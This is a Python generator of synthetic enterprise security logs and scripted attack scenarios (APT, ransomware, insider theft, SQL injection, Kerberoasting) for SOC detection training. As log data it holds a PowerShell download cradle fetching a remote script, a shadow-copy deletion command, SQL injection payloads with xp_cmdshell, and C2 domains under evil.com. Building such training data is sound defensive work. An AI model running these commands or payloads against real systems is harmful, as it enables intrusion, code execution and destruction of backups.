"""
Enterprise Security Data Generators.

Generates realistic security log data compatible with:
- Splunk Enterprise Security
- Boss of the SOC (BOTS) datasets
- Common enterprise security tools

Sourcetypes supported:
- Windows Event Logs (wineventlog)
- Sysmon (sysmon)
- Firewall logs (pan:traffic, cisco:asa)
- Proxy logs (squid, bluecoat)
- IDS/IPS (suricata, snort)
- DNS logs (dns)
- Endpoint Detection (edr:alert)
- Cloud audit logs (aws:cloudtrail, azure:audit)

Reference datasets:
- BOTSv1: https://github.com/splunk/botsv1
- BOTSv2: https://github.com/splunk/botsv2
- BOTSv3: https://github.com/splunk/botsv3
"""

import json
import random
import secrets
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum
from typing import Any, Generator, Iterator

from faker import Faker

fake = Faker()


class LogSourceType(str, Enum):
    """Supported log source types."""

    # Windows
    WINEVENTLOG_SECURITY = "wineventlog:security"
    WINEVENTLOG_SYSTEM = "wineventlog:system"
    WINEVENTLOG_POWERSHELL = "wineventlog:powershell"
    SYSMON = "sysmon"

    # Network
    PAN_TRAFFIC = "pan:traffic"
    CISCO_ASA = "cisco:asa"
    SQUID = "squid"
    BLUECOAT = "bluecoat:proxysg"

    # Security Tools
    SURICATA = "suricata"
    SNORT = "snort"
    EDR_CROWDSTRIKE = "crowdstrike:events"
    EDR_CARBON_BLACK = "carbonblack:events"
    ANTIVIRUS = "symantec:ep"

    # DNS
    DNS = "dns"
    DNS_BIND = "dns:bind"

    # Authentication
    OKTA = "okta:log"
    AZURE_SIGNIN = "azure:signin"

    # Cloud
    AWS_CLOUDTRAIL = "aws:cloudtrail"
    AZURE_AUDIT = "azure:audit"
    GCP_AUDIT = "gcp:audit"

    # Email
    O365_MESSAGE_TRACE = "o365:message:trace"
    PROOFPOINT = "proofpoint:pps"


@dataclass
class NetworkAsset:
    """Represents a network asset for log generation."""

    hostname: str
    ip_address: str
    mac_address: str
    os: str
    asset_type: str  # workstation, server, dc, firewall, etc.
    users: list[str] = field(default_factory=list)
    services: list[str] = field(default_factory=list)


@dataclass
class NetworkEnvironment:
    """Simulated network environment for realistic log generation."""

    domain: str
    internal_network: str
    assets: list[NetworkAsset] = field(default_factory=list)
    dns_servers: list[str] = field(default_factory=list)
    domain_controllers: list[str] = field(default_factory=list)
    mail_servers: list[str] = field(default_factory=list)
    web_servers: list[str] = field(default_factory=list)


class EnterpriseDataGenerator:
    """
    Generates realistic enterprise security log data.

    Designed to produce data compatible with:
    - Splunk Enterprise Security
    - BOTS-style CTF scenarios
    - Security operations training
    """

    def __init__(self, seed: int | None = None) -> None:
        if seed:
            random.seed(seed)
            Faker.seed(seed)

        self.fake = Faker()
        self.environment = self._generate_environment()

    def _generate_environment(self) -> NetworkEnvironment:
        """Generate a realistic network environment."""
        domain = "frothy.lan"  # BOTS reference
        internal_net = "192.168.1"

        assets = []

        # Domain Controllers
        for i in range(2):
            assets.append(NetworkAsset(
                hostname=f"DC{i+1}",
                ip_address=f"{internal_net}.{10+i}",
                mac_address=self._generate_mac(),
                os="Windows Server 2019",
                asset_type="domain_controller",
                services=["ldap", "kerberos", "dns"],
            ))

        # Workstations
        for i in range(20):
            username = self.fake.user_name()
            assets.append(NetworkAsset(
                hostname=f"WORKSTATION-{100+i}",
                ip_address=f"{internal_net}.{100+i}",
                mac_address=self._generate_mac(),
                os=random.choice(["Windows 10", "Windows 11"]),
                asset_type="workstation",
                users=[username],
            ))

        # Servers
        server_types = [
            ("WEB01", "web_server", ["http", "https"]),
            ("WEB02", "web_server", ["http", "https"]),
            ("SQL01", "database", ["mssql"]),
            ("FILE01", "file_server", ["smb", "nfs"]),
            ("MAIL01", "mail_server", ["smtp", "imap"]),
        ]
        for hostname, stype, services in server_types:
            assets.append(NetworkAsset(
                hostname=hostname,
                ip_address=f"{internal_net}.{50+len(assets)}",
                mac_address=self._generate_mac(),
                os="Windows Server 2019",
                asset_type=stype,
                services=services,
            ))

        return NetworkEnvironment(
            domain=domain,
            internal_network=internal_net,
            assets=assets,
            dns_servers=[f"{internal_net}.10", f"{internal_net}.11"],
            domain_controllers=[f"{internal_net}.10", f"{internal_net}.11"],
            mail_servers=[f"{internal_net}.55"],
            web_servers=[f"{internal_net}.51", f"{internal_net}.52"],
        )

    def _generate_mac(self) -> str:
        """Generate a MAC address."""
        return ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))

    def generate_background_logs(
        self,
        start_time: datetime,
        duration_hours: int = 24,
        events_per_hour: int = 1000,
    ) -> Generator[dict[str, Any], None, None]:
        """
        Generate background/benign log traffic.

        This creates the "noise" that makes attack detection realistic.
        """
        end_time = start_time + timedelta(hours=duration_hours)
        current_time = start_time

        while current_time < end_time:
            # Generate events for this hour
            for _ in range(events_per_hour):
                event_time = current_time + timedelta(
                    seconds=random.randint(0, 3599)
                )

                # Choose a random log type
                log_type = random.choice([
                    self._generate_windows_logon,
                    self._generate_process_creation,
                    self._generate_network_connection,
                    self._generate_dns_query,
                    self._generate_proxy_log,
                    self._generate_firewall_log,
                ])

                yield log_type(event_time, is_benign=True)

            current_time += timedelta(hours=1)

    def _generate_windows_logon(
        self, timestamp: datetime, is_benign: bool = True
    ) -> dict[str, Any]:
        """Generate Windows logon event."""
        asset = random.choice([
            a for a in self.environment.assets
            if a.asset_type in ["workstation", "domain_controller"]
        ])

        event_code = 4624 if is_benign or random.random() > 0.3 else 4625
        logon_type = random.choice([2, 3, 10]) if is_benign else random.choice([3, 10])

        return {
            "_time": timestamp.isoformat(),
            "sourcetype": LogSourceType.WINEVENTLOG_SECURITY.value,
            "index": "wineventlog",
            "EventCode": event_code,
            "EventType": "Success" if event_code == 4624 else "Failure",
            "LogonType": logon_type,
            "TargetUserName": asset.users[0] if asset.users else self.fake.user_name(),
            "TargetDomainName": self.environment.domain.split(".")[0].upper(),
            "IpAddress": asset.ip_address if is_benign else self._generate_external_ip(),
            "ComputerName": asset.hostname,
            "WorkstationName": asset.hostname,
        }

    def _generate_process_creation(
        self, timestamp: datetime, is_benign: bool = True
    ) -> dict[str, Any]:
        """Generate Sysmon process creation event (EventCode 1)."""
        asset = random.choice([
            a for a in self.environment.assets
            if a.asset_type == "workstation"
        ])

        if is_benign:
            process = random.choice([
                ("C:\\Windows\\System32\\notepad.exe", "notepad.exe"),
                ("C:\\Windows\\explorer.exe", "explorer.exe"),
                ("C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE", "WINWORD.EXE"),
                ("C:\\Windows\\System32\\svchost.exe", "-k netsvcs"),
                ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "--type=renderer"),
            ])
            image, command = process
        else:
            process = random.choice([
                ("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c whoami"),
                ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "-enc BASE64STRING"),
                ("C:\\Windows\\Temp\\payload.exe", "payload.exe"),
                ("C:\\Users\\Public\\malware.exe", "malware.exe -connect"),
            ])
            image, command = process

        return {
            "_time": timestamp.isoformat(),
            "sourcetype": LogSourceType.SYSMON.value,
            "index": "sysmon",
            "EventCode": 1,
            "Image": image,
            "CommandLine": f"{image} {command}",
            "ParentImage": "C:\\Windows\\explorer.exe" if is_benign else "C:\\Windows\\System32\\cmd.exe",
            "User": asset.users[0] if asset.users else "SYSTEM",
            "ComputerName": asset.hostname,
            "ProcessId": random.randint(1000, 65535),
            "ParentProcessId": random.randint(100, 999),
            "Hashes": f"SHA256={secrets.token_hex(32)}",
        }

    def _generate_network_connection(
        self, timestamp: datetime, is_benign: bool = True
    ) -> dict[str, Any]:
        """Generate Sysmon network connection event (EventCode 3)."""
        asset = random.choice(self.environment.assets)

        if is_benign:
            dest_ip = random.choice([
                "8.8.8.8", "1.1.1.1",  # DNS
                "13.107.42.14",  # Microsoft
                "172.217.14.99",  # Google
                "52.94.236.248",  # AWS
            ])
            dest_port = random.choice([80, 443, 53])
            process = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
        else:
            dest_ip = self._generate_external_ip()
            dest_port = random.choice([4444, 8080, 1337, 31337])
            process = random.choice([
                "C:\\Windows\\System32\\cmd.exe",
                "C:\\Windows\\Temp\\beacon.exe",
                "C:\\Windows\\System32\\rundll32.exe",
            ])

        return {
            "_time": timestamp.isoformat(),
            "sourcetype": LogSourceType.SYSMON.value,
            "index": "sysmon",
            "EventCode": 3,
            "Image": process,
            "SourceIp": asset.ip_address,
            "SourcePort": random.randint(49152, 65535),
            "DestinationIp": dest_ip,
            "DestinationPort": dest_port,
            "Protocol": "tcp",
            "ComputerName": asset.hostname,
            "User": asset.users[0] if asset.users else "SYSTEM",
        }

    def _generate_dns_query(
        self, timestamp: datetime, is_benign: bool = True
    ) -> dict[str, Any]:
        """Generate DNS query log."""
        asset = random.choice(self.environment.assets)

        if is_benign:
            domain = random.choice([
                "www.google.com",
                "outlook.office365.com",
                "update.microsoft.com",
                "cdn.cloudflare.com",
                f"internal.{self.environment.domain}",
            ])
        else:
            domain = random.choice([
                f"c2-{secrets.token_hex(4)}.evil.com",
                f"{secrets.token_hex(16)}.dnscat.io",
                f"update-{secrets.token_hex(4)}.download.net",
            ])

        return {
            "_time": timestamp.isoformat(),
            "sourcetype": LogSourceType.DNS.value,
            "index": "dns",
            "query": domain,
            "query_type": random.choice(["A", "AAAA", "TXT", "MX"]),
            "src_ip": asset.ip_address,
            "dest_ip": random.choice(self.environment.dns_servers),
            "answer": self._generate_external_ip() if not is_benign else f"93.184.{random.randint(1,255)}.{random.randint(1,255)}",
            "response_code": "NOERROR",
        }

    def _generate_proxy_log(
        self, timestamp: datetime, is_benign: bool = True
    ) -> dict[str, Any]:
        """Generate proxy log (Squid format)."""
        asset = random.choice([
            a for a in self.environment.assets
            if a.asset_type == "workstation"
        ])

        if is_benign:
            domain = random.choice([
                "www.google.com",
                "github.com",
                "stackoverflow.com",
                "docs.microsoft.com",
                "aws.amazon.com",
            ])
            uri = random.choice(["/", "/api/v1/data", "/search?q=python", "/docs/latest"])
            bytes_out = random.randint(100, 10000)
        else:
            domain = f"files.{secrets.token_hex(4)}.io"
            uri = random.choice([
                f"/beacon/{secrets.token_hex(8)}",
                f"/shell/{secrets.token_hex(8)}.exe",
                f"/exfil?data={secrets.token_hex(32)}",
            ])
            bytes_out = random.randint(50000, 5000000)  # Large exfil

        return {
            "_time": timestamp.isoformat(),
            "sourcetype": LogSourceType.SQUID.value,
            "index": "proxy",
            "src_ip": asset.ip_address,
            "dest_host": domain,
            "uri_path": uri,
            "method": random.choice(["GET", "POST"]),
            "status": random.choice([200, 301, 302, 404]) if is_benign else 200,
            "bytes_in": random.randint(100, 5000),
            "bytes_out": bytes_out,
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "content_type": random.choice(["text/html", "application/json", "application/octet-stream"]),
        }

    def _generate_firewall_log(
        self, timestamp: datetime, is_benign: bool = True
    ) -> dict[str, Any]:
        """Generate Palo Alto firewall log."""
        asset = random.choice(self.environment.assets)

        if is_benign:
            dest_ip = self._generate_external_ip()
            dest_port = random.choice([80, 443, 53, 25])
            action = "allow"
        else:
            dest_ip = self._generate_external_ip()
            dest_port = random.choice([4444, 1337, 31337, 6667])
            action = random.choice(["allow", "deny"])

        return {
            "_time": timestamp.isoformat(),
            "sourcetype": LogSourceType.PAN_TRAFFIC.value,
            "index": "firewall",
            "src_ip": asset.ip_address,
            "src_port": random.randint(49152, 65535),
            "dest_ip": dest_ip,
            "dest_port": dest_port,
            "protocol": "tcp",
            "action": action,
            "bytes_sent": random.randint(100, 10000),
            "bytes_received": random.randint(100, 50000),
            "app": random.choice(["web-browsing", "ssl", "dns", "unknown"]),
            "rule": "default-allow" if is_benign else "c2-detection",
        }

    def _generate_external_ip(self) -> str:
        """Generate a random external IP address."""
        # Avoid private ranges
        first_octet = random.choice([
            *range(1, 10), *range(11, 100), *range(101, 126),
            *range(128, 172), *range(173, 192), *range(193, 224)
        ])
        return f"{first_octet}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

    def generate_attack_scenario(
        self,
        scenario_name: str,
        start_time: datetime,
    ) -> Generator[dict[str, Any], None, None]:
        """
        Generate logs for a predefined attack scenario.

        Scenarios are based on BOTS and common attack patterns.
        """
        scenarios = {
            "apt_intrusion": self._scenario_apt_intrusion,
            "ransomware_attack": self._scenario_ransomware,
            "insider_threat": self._scenario_insider_threat,
            "web_app_attack": self._scenario_web_app_attack,
            "credential_theft": self._scenario_credential_theft,
        }

        scenario_func = scenarios.get(scenario_name)
        if not scenario_func:
            raise ValueError(f"Unknown scenario: {scenario_name}")

        yield from scenario_func(start_time)

    def _scenario_apt_intrusion(
        self, start_time: datetime
    ) -> Generator[dict[str, Any], None, None]:
        """
        APT intrusion scenario.

        Based on BOTSv2 APT scenario.
        Simulates: Spearphishing -> Execution -> Persistence -> Lateral Movement -> Exfil
        """
        current_time = start_time
        victim = random.choice([
            a for a in self.environment.assets if a.asset_type == "workstation"
        ])

        # Phase 1: Spearphishing email
        yield {
            "_time": current_time.isoformat(),
            "sourcetype": LogSourceType.O365_MESSAGE_TRACE.value,
            "index": "email",
            "sender": "hr-notifications@hr-update.net",
            "recipient": f"{victim.users[0]}@{self.environment.domain}",
            "subject": "Urgent: Review Your Benefits Enrollment",
            "attachment": "Benefits_2024.docm",
            "action": "Delivered",
        }

        current_time += timedelta(minutes=5)

        # Phase 2: Macro execution
        yield {
            "_time": current_time.isoformat(),
            "sourcetype": LogSourceType.SYSMON.value,
            "index": "sysmon",
            "EventCode": 1,
            "Image": "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
            "CommandLine": 'WINWORD.EXE /n "C:\\Users\\' + victim.users[0] + '\\Downloads\\Benefits_2024.docm"',
            "ParentImage": "C:\\Windows\\explorer.exe",
            "ComputerName": victim.hostname,
            "User": victim.users[0],
        }

        current_time += timedelta(seconds=30)

        # PowerShell download cradle
        yield {
            "_time": current_time.isoformat(),
            "sourcetype": LogSourceType.WINEVENTLOG_POWERSHELL.value,
            "index": "wineventlog",
            "EventCode": 4104,
            "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://185.43.21.10/shell.ps1')",
            "ComputerName": victim.hostname,
        }

        current_time += timedelta(seconds=10)

        # C2 beacon established
        yield {
            "_time": current_time.isoformat(),
            "sourcetype": LogSourceType.SYSMON.value,
            "index": "sysmon",
            "EventCode": 3,
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "SourceIp": victim.ip_address,
            "DestinationIp": "185.43.21.10",
            "DestinationPort": 443,
            "ComputerName": victim.hostname,
        }

        # Continue with more phases...
        current_time += timedelta(hours=2)

        # Credential dumping
        yield {
            "_time": current_time.isoformat(),
            "sourcetype": LogSourceType.SYSMON.value,
            "index": "sysmon",
            "EventCode": 10,
            "SourceImage": "C:\\Windows\\Temp\\beacon.exe",
            "TargetImage": "C:\\Windows\\System32\\lsass.exe",
            "GrantedAccess": "0x1010",
            "ComputerName": victim.hostname,
        }

    def _scenario_ransomware(
        self, start_time: datetime
    ) -> Generator[dict[str, Any], None, None]:
        """
        Ransomware attack scenario.

        Simulates rapid encryption across network.
        """
        current_time = start_time
        initial_victim = random.choice([
            a for a in self.environment.assets if a.asset_type == "workstation"
        ])

        # Initial access via RDP brute force
        for i in range(50):  # Failed attempts
            yield {
                "_time": (current_time + timedelta(seconds=i*2)).isoformat(),
                "sourcetype": LogSourceType.WINEVENTLOG_SECURITY.value,
                "index": "wineventlog",
                "EventCode": 4625,
                "LogonType": 10,
                "TargetUserName": random.choice(["admin", "administrator", "user"]),
                "IpAddress": "45.33.32.156",
                "ComputerName": initial_victim.hostname,
            }

        current_time += timedelta(minutes=2)

        # Successful login
        yield {
            "_time": current_time.isoformat(),
            "sourcetype": LogSourceType.WINEVENTLOG_SECURITY.value,
            "index": "wineventlog",
            "EventCode": 4624,
            "LogonType": 10,
            "TargetUserName": "administrator",
            "IpAddress": "45.33.32.156",
            "ComputerName": initial_victim.hostname,
        }

        current_time += timedelta(minutes=5)

        # Shadow copy deletion
        yield {
            "_time": current_time.isoformat(),
            "sourcetype": LogSourceType.SYSMON.value,
            "index": "sysmon",
            "EventCode": 1,
            "Image": "C:\\Windows\\System32\\vssadmin.exe",
            "CommandLine": "vssadmin.exe delete shadows /all /quiet",
            "ComputerName": initial_victim.hostname,
            "User": "administrator",
        }

        current_time += timedelta(seconds=30)

        # Mass file encryption
        for i in range(100):
            yield {
                "_time": (current_time + timedelta(seconds=i)).isoformat(),
                "sourcetype": LogSourceType.SYSMON.value,
                "index": "sysmon",
                "EventCode": 11,
                "TargetFilename": f"C:\\Users\\{initial_victim.users[0]}\\Documents\\file{i}.encrypted",
                "Image": "C:\\Windows\\Temp\\locker.exe",
                "ComputerName": initial_victim.hostname,
            }

    def _scenario_insider_threat(
        self, start_time: datetime
    ) -> Generator[dict[str, Any], None, None]:
        """
        Insider threat scenario.

        Simulates employee data theft before departure.
        """
        current_time = start_time
        insider = random.choice([
            a for a in self.environment.assets if a.asset_type == "workstation"
        ])

        # Unusual access patterns over time
        for day in range(7):
            day_start = current_time + timedelta(days=day)

            # Access to sensitive file shares
            for i in range(random.randint(50, 200)):
                yield {
                    "_time": (day_start + timedelta(hours=random.randint(18, 23))).isoformat(),
                    "sourcetype": LogSourceType.WINEVENTLOG_SECURITY.value,
                    "index": "wineventlog",
                    "EventCode": 5140,  # Network share access
                    "ShareName": random.choice(["\\\\FILE01\\Confidential", "\\\\FILE01\\HR", "\\\\FILE01\\Finance"]),
                    "IpAddress": insider.ip_address,
                    "SubjectUserName": insider.users[0],
                }

            # Large data transfer to personal cloud storage
            yield {
                "_time": (day_start + timedelta(hours=22)).isoformat(),
                "sourcetype": LogSourceType.SQUID.value,
                "index": "proxy",
                "src_ip": insider.ip_address,
                "dest_host": random.choice(["dropbox.com", "drive.google.com", "onedrive.live.com"]),
                "method": "POST",
                "bytes_out": random.randint(10000000, 100000000),  # 10MB-100MB
                "user": insider.users[0],
            }

    def _scenario_web_app_attack(
        self, start_time: datetime
    ) -> Generator[dict[str, Any], None, None]:
        """
        Web application attack scenario.

        Simulates SQLi/XSS attacks on web server.
        """
        current_time = start_time
        web_server = next(
            a for a in self.environment.assets if a.asset_type == "web_server"
        )
        attacker_ip = self._generate_external_ip()

        # Reconnaissance - directory enumeration
        for i in range(100):
            yield {
                "_time": (current_time + timedelta(seconds=i)).isoformat(),
                "sourcetype": "access_combined",
                "index": "web",
                "src_ip": attacker_ip,
                "dest_ip": web_server.ip_address,
                "method": "GET",
                "uri_path": random.choice([
                    "/admin", "/wp-admin", "/phpmyadmin", "/backup",
                    "/.git/config", "/robots.txt", "/sitemap.xml",
                ]),
                "status": random.choice([200, 403, 404]),
                "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1)",
            }

        current_time += timedelta(minutes=5)

        # SQL injection attempts
        sqli_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users;--",
            "' UNION SELECT * FROM passwords--",
            "1; EXEC xp_cmdshell('whoami')--",
        ]

        for i, payload in enumerate(sqli_payloads):
            yield {
                "_time": (current_time + timedelta(seconds=i*10)).isoformat(),
                "sourcetype": "access_combined",
                "index": "web",
                "src_ip": attacker_ip,
                "dest_ip": web_server.ip_address,
                "method": "POST",
                "uri_path": f"/login?username=admin&password={payload}",
                "status": 500,
                "user_agent": "sqlmap/1.5",
            }

    def _scenario_credential_theft(
        self, start_time: datetime
    ) -> Generator[dict[str, Any], None, None]:
        """
        Credential theft scenario.

        Simulates Kerberoasting and pass-the-hash attacks.
        """
        current_time = start_time
        victim = random.choice([
            a for a in self.environment.assets if a.asset_type == "workstation"
        ])
        dc = next(
            a for a in self.environment.assets if a.asset_type == "domain_controller"
        )

        # Kerberoasting - TGS requests for service accounts
        service_accounts = [
            "svc_sql", "svc_backup", "svc_web", "svc_ftp", "svc_mail"
        ]

        for svc in service_accounts:
            yield {
                "_time": current_time.isoformat(),
                "sourcetype": LogSourceType.WINEVENTLOG_SECURITY.value,
                "index": "wineventlog",
                "EventCode": 4769,  # Kerberos Service Ticket
                "ServiceName": f"{svc}$",
                "TicketEncryptionType": "0x17",  # RC4 - indicator of Kerberoasting
                "IpAddress": victim.ip_address,
                "ComputerName": dc.hostname,
            }
            current_time += timedelta(seconds=2)

        current_time += timedelta(hours=1)

        # Pass-the-hash attack
        yield {
            "_time": current_time.isoformat(),
            "sourcetype": LogSourceType.WINEVENTLOG_SECURITY.value,
            "index": "wineventlog",
            "EventCode": 4624,
            "LogonType": 9,  # NewCredentials - common in PtH
            "TargetUserName": "svc_backup",
            "AuthenticationPackageName": "NTLM",
            "IpAddress": victim.ip_address,
            "ComputerName": dc.hostname,
        }


# Export for easy access
data_generator = EnterpriseDataGenerator()
